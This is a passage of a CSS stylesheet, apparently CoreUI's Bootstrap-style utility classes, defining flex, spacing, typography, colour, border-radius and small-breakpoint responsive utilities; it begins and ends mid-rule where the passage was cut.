            .flex-grow-0 {
                flex-grow: 0 !important;
            }
            .flex-grow-1 {
                flex-grow: 1 !important;
            }
            .flex-shrink-0 {
                flex-shrink: 0 !important;
            }
            .flex-shrink-1 {
                flex-shrink: 1 !important;
            }
            .flex-wrap {
                flex-wrap: wrap !important;
            }
            .flex-nowrap {
                flex-wrap: nowrap !important;
            }
            .flex-wrap-reverse {
                flex-wrap: wrap-reverse !important;
            }
            .justify-content-start {
                justify-content: flex-start !important;
            }
            .justify-content-end {
                justify-content: flex-end !important;
            }
            .justify-content-center {
                justify-content: center !important;
            }
            .justify-content-between {
                justify-content: space-between !important;
            }
            .justify-content-around {
                justify-content: space-around !important;
            }
            .justify-content-evenly {
                justify-content: space-evenly !important;
            }
            .align-items-start {
                align-items: flex-start !important;
            }
            .align-items-end {
                align-items: flex-end !important;
            }
            .align-items-center {
                align-items: center !important;
            }
            .align-items-baseline {
                align-items: baseline !important;
            }
            .align-items-stretch {
                align-items: stretch !important;
            }
            .align-content-start {
                align-content: flex-start !important;
            }
            .align-content-end {
                align-content: flex-end !important;
            }
            .align-content-center {
                align-content: center !important;
            }
            .align-content-between {
                align-content: space-between !important;
            }
            .align-content-around {
                align-content: space-around !important;
            }
            .align-content-stretch {
                align-content: stretch !important;
            }
            .align-self-auto {
                align-self: auto !important;
            }
            .align-self-start {
                align-self: flex-start !important;
            }
            .align-self-end {
                align-self: flex-end !important;
            }
            .align-self-center {
                align-self: center !important;
            }
            .align-self-baseline {
                align-self: baseline !important;
            }
            .align-self-stretch {
                align-self: stretch !important;
            }
            .order-first {
                order: -1 !important;
            }
            .order-0 {
                order: 0 !important;
            }
            .order-1 {
                order: 1 !important;
            }
            .order-2 {
                order: 2 !important;
            }
            .order-3 {
                order: 3 !important;
            }
            .order-4 {
                order: 4 !important;
            }
            .order-5 {
                order: 5 !important;
            }
            .order-last {
                order: 6 !important;
            }
            .m-0 {
                margin: 0 !important;
            }
            .m-1 {
                margin: 0.25rem !important;
            }
            .m-2 {
                margin: 0.5rem !important;
            }
            .m-3 {
                margin: 1rem !important;
            }
            .m-4 {
                margin: 1.5rem !important;
            }
            .m-5 {
                margin: 3rem !important;
            }
            .m-auto {
                margin: auto !important;
            }
            .mx-0 {
                margin-right: 0 !important;
                margin-left: 0 !important;
            }
            .mx-1 {
                margin-right: 0.25rem !important;
                margin-left: 0.25rem !important;
            }
            .mx-2 {
                margin-right: 0.5rem !important;
                margin-left: 0.5rem !important;
            }
            .mx-3 {
                margin-right: 1rem !important;
                margin-left: 1rem !important;
            }
            .mx-4 {
                margin-right: 1.5rem !important;
                margin-left: 1.5rem !important;
            }
            .mx-5 {
                margin-right: 3rem !important;
                margin-left: 3rem !important;
            }
            .mx-auto {
                margin-right: auto !important;
                margin-left: auto !important;
            }
            .my-0 {
                margin-top: 0 !important;
                margin-bottom: 0 !important;
            }
            .my-1 {
                margin-top: 0.25rem !important;
                margin-bottom: 0.25rem !important;
            }
            .my-2 {
                margin-top: 0.5rem !important;
                margin-bottom: 0.5rem !important;
            }
            .my-3 {
                margin-top: 1rem !important;
                margin-bottom: 1rem !important;
            }
            .my-4 {
                margin-top: 1.5rem !important;
                margin-bottom: 1.5rem !important;
            }
            .my-5 {
                margin-top: 3rem !important;
                margin-bottom: 3rem !important;
            }
            .my-auto {
                margin-top: auto !important;
                margin-bottom: auto !important;
            }
            .mt-0 {
                margin-top: 0 !important;
            }
            .mt-1 {
                margin-top: 0.25rem !important;
            }
            .mt-2 {
                margin-top: 0.5rem !important;
            }
            .mt-3 {
                margin-top: 1rem !important;
            }
            .mt-4 {
                margin-top: 1.5rem !important;
            }
            .mt-5 {
                margin-top: 3rem !important;
            }
            .mt-auto {
                margin-top: auto !important;
            }
            html:not([dir="rtl"]) .me-0 {
                margin-right: 0 !important;
            }
            *[dir="rtl"] .me-0 {
                margin-left: 0 !important;
            }
            html:not([dir="rtl"]) .me-1 {
                margin-right: 0.25rem !important;
            }
            *[dir="rtl"] .me-1 {
                margin-left: 0.25rem !important;
            }
            html:not([dir="rtl"]) .me-2 {
                margin-right: 0.5rem !important;
            }
            *[dir="rtl"] .me-2 {
                margin-left: 0.5rem !important;
            }
            html:not([dir="rtl"]) .me-3 {
                margin-right: 1rem !important;
            }
            *[dir="rtl"] .me-3 {
                margin-left: 1rem !important;
            }
            html:not([dir="rtl"]) .me-4 {
                margin-right: 1.5rem !important;
            }
            *[dir="rtl"] .me-4 {
                margin-left: 1.5rem !important;
            }
            html:not([dir="rtl"]) .me-5 {
                margin-right: 3rem !important;
            }
            *[dir="rtl"] .me-5 {
                margin-left: 3rem !important;
            }
            html:not([dir="rtl"]) .me-auto {
                margin-right: auto !important;
            }
            *[dir="rtl"] .me-auto {
                margin-left: auto !important;
            }
            .mb-0 {
                margin-bottom: 0 !important;
            }
            .mb-1 {
                margin-bottom: 0.25rem !important;
            }
            .mb-2 {
                margin-bottom: 0.5rem !important;
            }
            .mb-3 {
                margin-bottom: 1rem !important;
            }
            .mb-4 {
                margin-bottom: 1.5rem !important;
            }
            .mb-5 {
                margin-bottom: 3rem !important;
            }
            .mb-auto {
                margin-bottom: auto !important;
            }
            html:not([dir="rtl"]) .ms-0 {
                margin-left: 0 !important;
            }
            *[dir="rtl"] .ms-0 {
                margin-right: 0 !important;
            }
            html:not([dir="rtl"]) .ms-1 {
                margin-left: 0.25rem !important;
            }
            *[dir="rtl"] .ms-1 {
                margin-right: 0.25rem !important;
            }
            html:not([dir="rtl"]) .ms-2 {
                margin-left: 0.5rem !important;
            }
            *[dir="rtl"] .ms-2 {
                margin-right: 0.5rem !important;
            }
            html:not([dir="rtl"]) .ms-3 {
                margin-left: 1rem !important;
            }
            *[dir="rtl"] .ms-3 {
                margin-right: 1rem !important;
            }
            html:not([dir="rtl"]) .ms-4 {
                margin-left: 1.5rem !important;
            }
            *[dir="rtl"] .ms-4 {
                margin-right: 1.5rem !important;
            }
            html:not([dir="rtl"]) .ms-5 {
                margin-left: 3rem !important;
            }
            *[dir="rtl"] .ms-5 {
                margin-right: 3rem !important;
            }
            html:not([dir="rtl"]) .ms-auto {
                margin-left: auto !important;
            }
            *[dir="rtl"] .ms-auto {
                margin-right: auto !important;
            }
            .p-0 {
                padding: 0 !important;
            }
            .p-1 {
                padding: 0.25rem !important;
            }
            .p-2 {
                padding: 0.5rem !important;
            }
            .p-3 {
                padding: 1rem !important;
            }
            .p-4 {
                padding: 1.5rem !important;
            }
            .p-5 {
                padding: 3rem !important;
            }
            .px-0 {
                padding-right: 0 !important;
                padding-left: 0 !important;
            }
            .px-1 {
                padding-right: 0.25rem !important;
                padding-left: 0.25rem !important;
            }
            .px-2 {
                padding-right: 0.5rem !important;
                padding-left: 0.5rem !important;
            }
            .px-3 {
                padding-right: 1rem !important;
                padding-left: 1rem !important;
            }
            .px-4 {
                padding-right: 1.5rem !important;
                padding-left: 1.5rem !important;
            }
            .px-5 {
                padding-right: 3rem !important;
                padding-left: 3rem !important;
            }
            .py-0 {
                padding-top: 0 !important;
                padding-bottom: 0 !important;
            }
            .py-1 {
                padding-top: 0.25rem !important;
                padding-bottom: 0.25rem !important;
            }
            .py-2 {
                padding-top: 0.5rem !important;
                padding-bottom: 0.5rem !important;
            }
            .py-3 {
                padding-top: 1rem !important;
                padding-bottom: 1rem !important;
            }
            .py-4 {
                padding-top: 1.5rem !important;
                padding-bottom: 1.5rem !important;
            }
            .py-5 {
                padding-top: 3rem !important;
                padding-bottom: 3rem !important;
            }
            .pt-0 {
                padding-top: 0 !important;
            }
            .pt-1 {
                padding-top: 0.25rem !important;
            }
            .pt-2 {
                padding-top: 0.5rem !important;
            }
            .pt-3 {
                padding-top: 1rem !important;
            }
            .pt-4 {
                padding-top: 1.5rem !important;
            }
            .pt-5 {
                padding-top: 3rem !important;
            }
            html:not([dir="rtl"]) .pe-0 {
                padding-right: 0 !important;
            }
            *[dir="rtl"] .pe-0 {
                padding-left: 0 !important;
            }
            html:not([dir="rtl"]) .pe-1 {
                padding-right: 0.25rem !important;
            }
            *[dir="rtl"] .pe-1 {
                padding-left: 0.25rem !important;
            }
            html:not([dir="rtl"]) .pe-2 {
                padding-right: 0.5rem !important;
            }
            *[dir="rtl"] .pe-2 {
                padding-left: 0.5rem !important;
            }
            html:not([dir="rtl"]) .pe-3 {
                padding-right: 1rem !important;
            }
            *[dir="rtl"] .pe-3 {
                padding-left: 1rem !important;
            }
            html:not([dir="rtl"]) .pe-4 {
                padding-right: 1.5rem !important;
            }
            *[dir="rtl"] .pe-4 {
                padding-left: 1.5rem !important;
            }
            html:not([dir="rtl"]) .pe-5 {
                padding-right: 3rem !important;
            }
            *[dir="rtl"] .pe-5 {
                padding-left: 3rem !important;
            }
            .pb-0 {
                padding-bottom: 0 !important;
            }
            .pb-1 {
                padding-bottom: 0.25rem !important;
            }
            .pb-2 {
                padding-bottom: 0.5rem !important;
            }
            .pb-3 {
                padding-bottom: 1rem !important;
            }
            .pb-4 {
                padding-bottom: 1.5rem !important;
            }
            .pb-5 {
                padding-bottom: 3rem !important;
            }
            html:not([dir="rtl"]) .ps-0 {
                padding-left: 0 !important;
            }
            *[dir="rtl"] .ps-0 {
                padding-right: 0 !important;
            }
            html:not([dir="rtl"]) .ps-1 {
                padding-left: 0.25rem !important;
            }
            *[dir="rtl"] .ps-1 {
                padding-right: 0.25rem !important;
            }
            html:not([dir="rtl"]) .ps-2 {
                padding-left: 0.5rem !important;
            }
            *[dir="rtl"] .ps-2 {
                padding-right: 0.5rem !important;
            }
            html:not([dir="rtl"]) .ps-3 {
                padding-left: 1rem !important;
            }
            *[dir="rtl"] .ps-3 {
                padding-right: 1rem !important;
            }
            html:not([dir="rtl"]) .ps-4 {
                padding-left: 1.5rem !important;
            }
            *[dir="rtl"] .ps-4 {
                padding-right: 1.5rem !important;
            }
            html:not([dir="rtl"]) .ps-5 {
                padding-left: 3rem !important;
            }
            *[dir="rtl"] .ps-5 {
                padding-right: 3rem !important;
            }
            .gap-0 {
                gap: 0 !important;
            }
            .gap-1 {
                gap: 0.25rem !important;
            }
            .gap-2 {
                gap: 0.5rem !important;
            }
            .gap-3 {
                gap: 1rem !important;
            }
            .gap-4 {
                gap: 1.5rem !important;
            }
            .gap-5 {
                gap: 3rem !important;
            }
            .font-monospace {
                font-family: var(--cui-font-monospace) !important;
            }
            .fs-1 {
                font-size: calc(1.375rem + 1.5vw) !important;
            }
            .fs-2 {
                font-size: calc(1.325rem + 0.9vw) !important;
            }
            .fs-3 {
                font-size: calc(1.3rem + 0.6vw) !important;
            }
            .fs-4 {
                font-size: calc(1.275rem + 0.3vw) !important;
            }
            .fs-5 {
                font-size: 1.25rem !important;
            }
            .fs-6 {
                font-size: 1rem !important;
            }
            .fst-italic {
                font-style: italic !important;
            }
            .fst-normal {
                font-style: normal !important;
            }
            .fw-light {
                font-weight: 300 !important;
            }
            .fw-lighter {
                font-weight: lighter !important;
            }
            .fw-normal {
                font-weight: 400 !important;
            }
            .fw-medium {
                font-weight: 500 !important;
            }
            .fw-semibold {
                font-weight: 600 !important;
            }
            .fw-bold {
                font-weight: 700 !important;
            }
            .fw-bolder {
                font-weight: bolder !important;
            }
            .lh-1 {
                line-height: 1 !important;
            }
            .lh-sm {
                line-height: 1.25 !important;
            }
            .lh-base {
                line-height: 1.5 !important;
            }
            .lh-lg {
                line-height: 2 !important;
            }
            html:not([dir="rtl"]) .text-start {
                text-align: left !important;
            }
            *[dir="rtl"] .text-start {
                text-align: right !important;
            }
            html:not([dir="rtl"]) .text-end {
                text-align: right !important;
            }
            *[dir="rtl"] .text-end {
                text-align: left !important;
            }
            html:not([dir="rtl"]) .text-center {
                text-align: center !important;
            }
            *[dir="rtl"] .text-center {
                text-align: center !important;
            }
            .text-decoration-none {
                text-decoration: none !important;
            }
            .text-decoration-underline {
                text-decoration: underline !important;
            }
            .text-decoration-line-through {
                text-decoration: line-through !important;
            }
            .text-lowercase {
                text-transform: lowercase !important;
            }
            .text-uppercase {
                text-transform: uppercase !important;
            }
            .text-capitalize {
                text-transform: capitalize !important;
            }
            .text-wrap {
                white-space: normal !important;
            }
            .text-nowrap {
                white-space: nowrap !important;
            }
            .text-break {
                word-wrap: break-word !important;
                word-break: break-word !important;
            }
            .text-primary {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-primary-rgb), var(--cui-text-opacity)) !important;
            }
            .text-secondary {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-secondary-rgb), var(--cui-text-opacity)) !important;
            }
            .text-success {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-success-rgb), var(--cui-text-opacity)) !important;
            }
            .text-info {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-info-rgb), var(--cui-text-opacity)) !important;
            }
            .text-warning {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-warning-rgb), var(--cui-text-opacity)) !important;
            }
            .text-danger {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-danger-rgb), var(--cui-text-opacity)) !important;
            }
            .text-light {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-light-rgb), var(--cui-text-opacity)) !important;
            }
            .text-dark {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-dark-rgb), var(--cui-text-opacity)) !important;
            }
            .text-black {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-black-rgb), var(--cui-text-opacity)) !important;
            }
            .text-white {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-white-rgb), var(--cui-text-opacity)) !important;
            }
            .text-body {
                --cui-text-opacity: 1;
                color: rgba(var(--cui-body-color-rgb), var(--cui-text-opacity)) !important;
            }
            .text-muted {
                --cui-text-opacity: 1;
                color: rgba(44, 56, 74, 0.38) !important;
            }
            .text-black-50 {
                --cui-text-opacity: 1;
                color: rgba(0, 0, 21, 0.5) !important;
            }
            .text-white-50 {
                --cui-text-opacity: 1;
                color: rgba(255, 255, 255, 0.5) !important;
            }
            .text-reset {
                --cui-text-opacity: 1;
                color: inherit !important;
            }
            .text-high-emphasis-inverse {
                --cui-text-opacity: 1;
                color: rgba(255, 255, 255, 0.87) !important;
            }
            .text-medium-emphasis-inverse {
                --cui-text-opacity: 1;
                color: rgba(255, 255, 255, 0.6) !important;
            }
            .text-disabled-inverse {
                --cui-text-opacity: 1;
                color: rgba(255, 255, 255, 0.38) !important;
            }
            .text-high-emphasis {
                --cui-text-opacity: 1;
                color: rgba(44, 56, 74, 0.95) !important;
            }
            .text-medium-emphasis {
                --cui-text-opacity: 1;
                color: rgba(44, 56, 74, 0.681) !important;
            }
            .text-disabled {
                --cui-text-opacity: 1;
                color: rgba(44, 56, 74, 0.38) !important;
            }
            .text-opacity-25 {
                --cui-text-opacity: 0.25;
            }
            .text-opacity-50 {
                --cui-text-opacity: 0.5;
            }
            .text-opacity-75 {
                --cui-text-opacity: 0.75;
            }
            .text-opacity-100 {
                --cui-text-opacity: 1;
            }
            .bg-primary {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-primary-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-secondary {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-secondary-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-success {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-success-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-info {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-info-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-warning {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-warning-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-danger {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-danger-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-light {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-light-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-dark {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-dark-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-black {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-black-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-white {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-white-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-body {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-body-bg-rgb), var(--cui-bg-opacity)) !important;
            }
            .bg-transparent {
                --cui-bg-opacity: 1;
                background-color: transparent !important;
            }
            .bg-opacity-10 {
                --cui-bg-opacity: 0.1;
            }
            .bg-opacity-15 {
                --cui-bg-opacity: 0.15;
            }
            .bg-opacity-25 {
                --cui-bg-opacity: 0.25;
            }
            .bg-opacity-50 {
                --cui-bg-opacity: 0.5;
            }
            .bg-opacity-75 {
                --cui-bg-opacity: 0.75;
            }
            .bg-opacity-100 {
                --cui-bg-opacity: 1;
            }
            .bg-gradient {
                background-image: var(--cui-gradient) !important;
            }
            .user-select-all {
                -webkit-user-select: all !important;
                -moz-user-select: all !important;
                user-select: all !important;
            }
            .user-select-auto {
                -webkit-user-select: auto !important;
                -moz-user-select: auto !important;
                user-select: auto !important;
            }
            .user-select-none {
                -webkit-user-select: none !important;
                -moz-user-select: none !important;
                user-select: none !important;
            }
            .pe-none {
                pointer-events: none !important;
            }
            .pe-auto {
                pointer-events: auto !important;
            }
            .rounded {
                border-radius: var(--cui-border-radius) !important;
            }
            .rounded-0 {
                border-radius: 0 !important;
            }
            .rounded-1 {
                border-radius: var(--cui-border-radius-sm) !important;
            }
            .rounded-2 {
                border-radius: var(--cui-border-radius) !important;
            }
            .rounded-3 {
                border-radius: var(--cui-border-radius-lg) !important;
            }
            .rounded-4 {
                border-radius: var(--cui-border-radius-xl) !important;
            }
            .rounded-5 {
                border-radius: var(--cui-border-radius-2xl) !important;
            }
            .rounded-circle {
                border-radius: 50% !important;
            }
            .rounded-pill {
                border-radius: var(--cui-border-radius-pill) !important;
            }
            .rounded-top {
                border-top-left-radius: var(--cui-border-radius) !important;
                border-top-right-radius: var(--cui-border-radius) !important;
            }
            html:not([dir="rtl"]) .rounded-end {
                border-top-right-radius: var(--cui-border-radius) !important;
                border-bottom-right-radius: var(--cui-border-radius) !important;
            }
            *[dir="rtl"] .rounded-end {
                border-top-left-radius: var(--cui-border-radius) !important;
                border-bottom-left-radius: var(--cui-border-radius) !important;
            }
            .rounded-bottom {
                border-bottom-right-radius: var(--cui-border-radius) !important;
                border-bottom-left-radius: var(--cui-border-radius) !important;
            }
            html:not([dir="rtl"]) .rounded-start {
                border-bottom-left-radius: var(--cui-border-radius) !important;
                border-top-left-radius: var(--cui-border-radius) !important;
            }
            *[dir="rtl"] .rounded-start {
                border-bottom-right-radius: var(--cui-border-radius) !important;
                border-top-right-radius: var(--cui-border-radius) !important;
            }
            .visible {
                visibility: visible !important;
            }
            .invisible {
                visibility: hidden !important;
            }
            @media (min-width: 576px) {
                html:not([dir="rtl"]) .float-sm-start {
                    float: left !important;
                }
                *[dir="rtl"] .float-sm-start {
                    float: right !important;
                }
                html:not([dir="rtl"]) .float-sm-end {
                    float: right !important;
                }
                *[dir="rtl"] .float-sm-end {
                    float: left !important;
                }
                html:not([dir="rtl"]) .float-sm-none {
                    float: none !important;
                }
                *[dir="rtl"] .float-sm-none {
                    float: none !important;
                }
                .d-sm-inline {
                    display: inline !important;
                }
                .d-sm-inline-block {
                    display: inline-block !important;
                }
                .d-sm-block {
                    display: block !important;
                }
                .d-sm-grid {
                    display: grid !important;
                }
                .d-sm-table {
                    display: table !important;
                }
                .d-sm-table-row {
                    display: table-row !important;
                }
                .d-sm-table-cell {
                    display: table-cell !important;
                }
                .d-sm-flex {
                    display: flex !important;
                }
                .d-sm-inline-flex {
                    display: inline-flex !important;
                }
                .d-sm-none {
                    display: none !important;
                }
                .flex-sm-fill {
                    flex: 1 1 auto !important;
                }
                .flex-sm-row {
                    flex-direction: row !important;
                }
                .flex-sm-column {
                    flex-direction: column !important;
                }
                .flex-sm-row-reverse {
                    flex-direction: row-reverse !important;
                }
                .flex-sm-column-reverse {
                    flex-direction: column-reverse !important;
                }
                .flex-sm-grow-0 {
                    flex-grow: 0 !important;
                }
                .flex-sm-grow-1 {
                    flex-grow: 1 !important;
                }
                .flex-sm-shrink-0 {
                    flex-shrink: 0 !important;
                }
                .flex-sm-shrink-1 {
                    flex-shrink: 1 !important;
                }
                .flex-sm-wrap {
                    flex-wrap: wrap !important;
                }
                .flex-sm-nowrap {
                    flex-wrap: nowrap !important;
                }
                .flex-sm-wrap-reverse {
                    flex-wrap: wrap-reverse !important;
                }
                .justify-content-sm-start {
                    justify-content: flex-start !important;
                }
                .justify-content-sm-end {
                    justify-content: flex-end !important;
                }
                .justify-content-sm-center {
                    justify-content: center !important;
                }
                .justify-content-sm-between {
                    justify-content: space-between !important;
                }
                .justify-content-sm-around {
                    justify-content: space-around !important;
                }
                .justify-content-sm-evenly {
                    justify-content: space-evenly !important;
                }
                .align-items-sm-start {
                    align-items: flex-start !important;
                }
                .align-items-sm-end {
                    align-items: flex-end !important;
                }
                .align-items-sm-center {
                    align-items: center !important;
                }
                .align-items-sm-baseline {
                    align-items: baseline !important;
                }
                .align-items-sm-stretch {
                    align-items: stretch !important;
                }
                .align-content-sm-start {
                    align-content: flex-start !important;
                }
                .align-content-sm-end {
                    align-content: flex-end !important;
                }
                .align-content-sm-center {
                    align-content: center !important;
                }
                .align-content-sm-between {
                    align-content: space-between !important;
                }
                .align-content-sm-around {
                    align-content: space-around !important;
                }
                .align-content-sm-stretch {
                    align-content: stretch !important;
                }
                .align-self-sm-auto {
                    align-self: auto !important;
                }
                .align-self-sm-start {
                    align-self: flex-start !important;
                }
                .align-self-sm-end {
                    align-self: flex-end !important;
                }
                .align-self-sm-center {
                    align-self: center !important;
                }
                .align-self-sm-baseline {
                    align-self: baseline !important;
                }
                .align-self-sm-stretch {
                    align-self: stretch !important;
                }
                .order-sm-first {
                    order: -1 !important;
                }
                .order-sm-0 {
                    order: 0 !important;
                }
                .order-sm-1 {
                    order: 1 !important;
                }
                .order-sm-2 {
                    order: 2 !important;
                }
                .order-sm-3 {
                    order: 3 !important;
                }
                .order-sm-4 {
                    order: 4 !important;
                }
                .order-sm-5 {
                    order: 5 !important;
                }
                .order-sm-last {
                    order: 6 !important;
                }
                .m-sm-0 {
                    margin: 0 !important;
                }
                .m-sm-1 {
                    margin: 0.25rem !important;
                }
                .m-sm-2 {
                    margin: 0.5rem !important;
                }
                .m-sm-3 {
                    margin: 1rem !important;
                }
                .m-sm-4 {
                    margin: 1.5rem !important;
                }
                .m-sm-5 {
                    margin: 3rem !important;
                }
                .m-sm-auto {
                    margin: auto !important;
                }
                .mx-sm-0 {
                    margin-right: 0 !important;
                    margin-left: 0 !important;
                }
                .mx-sm-1 {
                    margin-right: 0.25rem !important;
                    margin-left: 0.25rem !important;
                }
                .mx-sm-2 {
                    margin-right: 0.5rem !important;
                    margin-left: 0.5rem !important;
                }
                .mx-sm-3 {
                    margin-right: 1rem !important;
                    margin-left: 1rem !important;
                }
                .mx-sm-4 {
                    margin-right: 1.5rem !important;
                    margin-left: 1.5rem !important;
                }
                .mx-sm-5 {
                    margin-right: 3rem !important;
                    margin-left: 3rem !important;
                }
                .mx-sm-auto {
                    margin-right: auto !important;
                    margin-left: auto !important;
                }
                .my-sm-0 {
                    margin-top: 0 !important;
                    margin-bottom: 0 !important;
                }
                .my-sm-1 {
                    margin-top: 0.25rem !important;
                    margin-bottom: 0.25rem !important;
                }
                .my-sm-2 {
                    margin-top: 0.5rem !important;
                    margin-bottom: 0.5rem !important;
                }
                .my-sm-3 {
                    margin-top: 1rem !important;
                    margin-bottom: 1rem !important;
                }
                .my-sm-4 {
                    margin-top: 1.5rem !important;
                    margin-bottom: 1.5rem !important;
                }
                .my-sm-5 {
                    margin-top: 3rem !important;
                    margin-bottom: 3rem !important;
                }
                .my-sm-auto {
                    margin-top: auto !important;
                    margin-bottom: auto !important;
                }
                .mt-sm-0 {
                    margin-top: 0 !important;
                }
                .mt-sm-1 {
                    margin-top: 0.25rem !important;
                }
                .mt-sm-2 {
                    margin-top: 0.5rem !important;
                }
                .mt-sm-3 {
                    margin-top: 1rem !important;
                }
                .mt-sm-4 {
                    margin-top: 1.5rem !important;
                }
                .mt-sm-5 {
                    margin-top: 3rem !important;
                }
                .mt-sm-auto {
                    margin-top: auto !important;
                }
                html:not([dir="rtl"]) .me-sm-0 {
                    margin-right: 0 !important;
                }
                *[dir="rtl"] .me-sm-0 {
                    margin-left: 0 !important;
                }
                html:not([dir="rtl"]) .me-sm-1 {
                    margin-right: 0.25rem !important;
                }
                *[dir="rtl"] .me-sm-1 {
                    margin-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .me-sm-2 {
                    margin-right: 0.5rem !important;
                }
                *[dir="rtl"] .me-sm-2 {
                    margin-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .me-sm-3 {
                    margin-right: 1rem !important;
                }
                *[dir="rtl"] .me-sm-3 {
                    margin-left: 1rem !important;
                }
                html:not([dir="rtl"]) .me-sm-4 {
                    margin-right: 1.5rem !important;
                }
                *[dir="rtl"] .me-sm-4 {
                    margin-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .me-sm-5 {
                    margin-right: 3rem !important;
                }
                *[dir="rtl"] .me-sm-5 {
                    margin-left: 3rem !important;
                }
                html:not([dir="rtl"]) .me-sm-auto {
                    margin-right: auto !important;
                }
                *[dir="rtl"] .me-sm-auto {
                    margin-left: auto !important;
                }
                .mb-sm-0 {
                    margin-bottom: 0 !important;
                }
                .mb-sm-1 {
                    margin-bottom: 0.25rem !important;
                }
                .mb-sm-2 {
                    margin-bottom: 0.5rem !important;
                }
                .mb-sm-3 {
                    margin-bottom: 1rem !important;
                }
                .mb-sm-4 {
                    margin-bottom: 1.5rem !important;
                }
                .mb-sm-5 {
                    margin-bottom: 3rem !important;
                }
                .mb-sm-auto {
                    margin-bottom: auto !important;
                }
                html:not([dir="rtl"]) .ms-sm-0 {
                    margin-left: 0 !important;
                }
                *[dir="rtl"] .ms-sm-0 {
                    margin-right: 0 !important;
                }
                html:not([dir="rtl"]) .ms-sm-1 {
                    margin-left: 0.25rem !important;
                }
                *[dir="rtl"] .ms-sm-1 {
                    margin-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ms-sm-2 {
                    margin-left: 0.5rem !important;
                }
                *[dir="rtl"] .ms-sm-2 {
                    margin-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ms-sm-3 {
                    margin-left: 1rem !important;
                }
                *[dir="rtl"] .ms-sm-3 {
                    margin-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ms-sm-4 {
                    margin-left: 1.5rem !important;
                }
                *[dir="rtl"] .ms-sm-4 {
                    margin-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ms-sm-5 {
                    margin-left: 3rem !important;
                }
                *[dir="rtl"] .ms-sm-5 {
                    margin-right: 3rem !important;
                }
                html:not([dir="rtl"]) .ms-sm-auto {
                    margin-left: auto !important;
                }
                *[dir="rtl"] .ms-sm-auto {
                    margin-right: auto !important;
                }
                .p-sm-0 {
                    padding: 0 !important;
                }
                .p-sm-1 {
                    padding: 0.25rem !important;
                }
                .p-sm-2 {
                    padding: 0.5rem !important;
                }
                .p-sm-3 {
                    padding: 1rem !important;
                }
                .p-sm-4 {
                    padding: 1.5rem !important;
                }
                .p-sm-5 {
                    padding: 3rem !important;
                }
                .px-sm-0 {
                    padding-right: 0 !important;
                    padding-left: 0 !important;
                }
                .px-sm-1 {
                    padding-right: 0.25rem !important;
                    padding-left: 0.25rem !important;
                }
                .px-sm-2 {
                    padding-right: 0.5rem !important;
                    padding-left: 0.5rem !important;
                }
                .px-sm-3 {
                    padding-right: 1rem !important;
                    padding-left: 1rem !important;
                }
                .px-sm-4 {
                    padding-right: 1.5rem !important;
                    padding-left: 1.5rem !important;
                }
                .px-sm-5 {
                    padding-right: 3rem !important;
                    padding-left: 3rem !important;
                }
                .py-sm-0 {
                    padding-top: 0 !important;
                    padding-bottom: 0 !important;
                }
                .py-sm-1 {
                    padding-top: 0.25rem !important;
                    padding-bottom: 0.25rem !important;
                }
                .py-sm-2 {
                    padding-top: 0.5rem !important;
                    padding-bottom: 0.5rem !important;
                }
                .py-sm-3 {
                    padding-top: 1rem !important;
                    padding-bottom: 1rem !important;
                }
                .py-sm-4 {
                    padding-top: 1.5rem !important;
                    padding-bottom: 1.5rem !important;
                }
                .py-sm-5 {
                    padding-top: 3rem !important;
                    padding-bottom: 3rem !important;
                }
                .pt-sm-0 {
                    padding-top: 0 !important;
                }
                .pt-sm-1 {
                    padding-top: 0.25rem !important;
                }
                .pt-sm-2 {
                    padding-top: 0.5rem !important;
                }
                .pt-sm-3 {
                    padding-top: 1rem !important;
                }
                .pt-sm-4 {
                    padding-top: 1.5rem !important;
                }
                .pt-sm-5 {
                    padding-top: 3rem !important;
                }
                html:not([dir="rtl"]) .pe-sm-0 {
                    padding-right: 0 !important;
                }
                *[dir="rtl"] .pe-sm-0 {
                    padding-left: 0 !important;
                }
                html:not([dir="rtl"]) .pe-sm-1 {
                    padding-right: 0.25rem !important;
                }
                *[dir="rtl"] .pe-sm-1 {
                    padding-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .pe-sm-2 {
                    padding-right: 0.5rem !important;
                }
                *[dir="rtl"] .pe-sm-2 {
                    padding-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .pe-sm-3 {
                    padding-right: 1rem !important;
                }
                *[dir="rtl"] .pe-sm-3 {
                    padding-left: 1rem !important;
                }
                html:not([dir="rtl"]) .pe-sm-4 {
                    padding-right: 1.5rem !important;
                }
                *[dir="rtl"] .pe-sm-4 {
